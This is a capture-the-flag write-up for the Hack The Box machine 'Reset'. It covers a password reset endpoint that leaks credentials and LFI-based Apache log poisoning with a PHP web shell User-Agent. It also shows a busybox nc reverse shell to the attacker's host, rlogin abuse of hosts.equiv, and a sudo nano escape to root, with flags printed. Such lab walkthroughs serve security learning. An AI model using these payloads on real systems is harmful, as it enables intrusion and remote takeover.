# HTB Write-Up: Reset

| Field      | Details                                                          |
|------------|-------------------------------------------------------------------|
| Platform   | Hack The Box                                                     |
| Difficulty | Easy                                                              |
| OS         | Linux                                                            |
| Date       | October 29, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Login & Insecure Password Reset](#2-enumeration--web-login--insecure-password-reset)
3. [Initial Access — LFI to RCE via Apache Access Log Poisoning](#3-initial-access--lfi-to-rce-via-apache-access-log-poisoning)
4. [Lateral Movement — Abusing /etc/hosts.equiv Trust (r-commands)](#4-lateral-movement--abusing-etchostsequiv-trust-r-commands)
5. [Privilege Escalation — sudo nano GTFOBins to Root](#5-privilege-escalation--sudo-nano-gtfobins-to-root)

---

## 1. Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.234.130 --ulimit=5000
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 512  | exec    |
| 513  | login   |
| 514  | shell   |

Ports 512–514 (`exec`, `login`, `shell`) stand out immediately — these are the classic **BSD r-services** (`rexec`, `rlogin`, `rsh`). Their presence is a strong hint that host-based trust (`.rhosts` / `hosts.equiv`) will matter later in the engagement, so this was kept in mind while enumerating the web application on port 80.

---

## 2. Enumeration — Web Login & Insecure Password Reset

### 2.1 — Login Page & Failed Attack Vectors

The web application exposed an admin login page. SQL injection, SSRF, and default credentials were all tested against it without success.

### 2.2 — Password Reset Reveals Credentials in the Response

The login page included a password reset feature. Submitting the username `admin` triggered the following request:

```
POST /reset_password.php HTTP/1.1
Host: 10.129.234.130
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 14

username=admin
```

The server's response leaked the newly generated password directly in the JSON body — a critical flaw, since this endpoint should never return the reset credential to the client:

```json
{"username":"admin","new_password":"7d1803db","timestamp":"2026-10-29 06:11:44"}
```

These credentials (`admin:7d1803db`) were used to log into the admin dashboard.

---

## 3. Initial Access — LFI to RCE via Apache Access Log Poisoning

### 3.1 — Discovering the Log Viewer

The admin dashboard included a "View Log File" feature that sent the target log path as a parameter:

```
POST /dashboard.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

file=%2Fvar%2Flog%2Fsyslog
```

Only two options were exposed in the UI (`syslog` and `auth.log`), but the parameter itself was tested directly. Classic LFI targets (`/etc/passwd`, etc.) and SSRF did not work, suggesting the functionality was restricted to log files specifically. Since the stack was Apache, the access log was targeted next:

```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

This succeeded and returned readable log entries, confirming **Local File Inclusion** scoped to log files.

### 3.2 — From LFI to RCE: Log Poisoning

With a readable, attacker-influenced log file in hand, the natural next step from LFI is **log poisoning**. The `IP` and `timestamp` fields in an access log are written by the server itself and can't be forged, but the **`User-Agent`** and **`Referer`** headers are fully client-controlled — whatever is sent in those headers gets written verbatim into the log file Apache maintains. Since that file was already being read back through the LFI, injecting PHP into one of those headers and then including the log file would cause the PHP to execute server-side.

A malicious `User-Agent` containing a PHP web shell one-liner was sent to seed the log:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.129.234.130/
```

The poisoned access log was then included via the LFI, with a `cmd` parameter appended to trigger command execution:

```
POST /dashboard.php?cmd=id HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

**Result:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

Command execution as `www-data` was confirmed.

### 3.3 — Reverse Shell

A listener was started and a reverse shell command injected through the same `cmd` parameter:

```bash
rlwrap nc -nvlp 4444
```

```
POST /dashboard.php?cmd=busybox+nc+10.10.14.25+4444+-e+sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

A connection landed on the listener as `www-data`, and the shell was upgraded:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 3.4 — User Flag

Enumeration of `/home` showed two users, `local` and `sadm`. The `sadm` home directory's `user.txt` was world-readable despite being root-owned, and was read directly as `www-data`:

```bash
cat /home/sadm/user.txt
# 19ba954c8ba8400cbfc0277f5f1669a4
```

---

## 4. Lateral Movement — Abusing /etc/hosts.equiv Trust (r-commands)

### 4.1 — Discovering the Trust Relationship

Further enumeration turned up `/etc/hosts.equiv`:

```
cat /etc/hosts.equiv
- root
- local
+ sadm
```

This ties directly back to the open **512/513/514** ports seen during recon. The `+` in front of `sadm` means that user is explicitly trusted for passwordless authentication via `rsh`/`rlogin`/`rcp` from any host listed, while `root` and `local` are explicitly denied (`-`). Seeing legacy r-service ports open during port scanning is itself the signal to go check `hosts.equiv` or `~/.rhosts` for exactly this kind of misconfigured trust — these binaries have no other reason to be running on a modern box.

### 4.2 — Switching to sadm and Logging In via rlogin

A local `sadm` user was created on the attacking machine so that its username would match the trust entry, then used to `rlogin` into the target without a password:

```bash
su sadm
rlogin sadm@10.129.92.170
```

```
sadm@reset:~$ whoami
sadm
```

A stray `muser.txt` file was present in the home directory but not part of the intended path.

---

## 5. Privilege Escalation — sudo nano GTFOBins to Root

### 5.1 — Recovering sudo Rights

A `tmux` session belonging to `sadm` was found already running and was attached to:

```bash
tmux attach -t sadm_session
```

Inside it, a password (`7lE2PAfVHfjz4HpE`) had been left usable for `sudo`:

```bash
sudo -l
```

```
User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

### 5.2 — Escaping nano to a Root Shell

`sudo` access to `nano` on a specific file is a well-known GTFOBins privilege escalation: nano's built-in **execute-command** shortcut (`CTRL+T`) runs an arbitrary command with the same privileges nano itself was launched with — in this case, root.

```bash
sudo /usr/bin/nano /etc/firewall.sh
# Inside nano: CTRL+T -> execute command as root
```

### 5.3 — Root Flag

```
ls /root/
cat root_279e22f8.txt
# 7ad6951bcb5a2edaffd7908b013d29b0
```
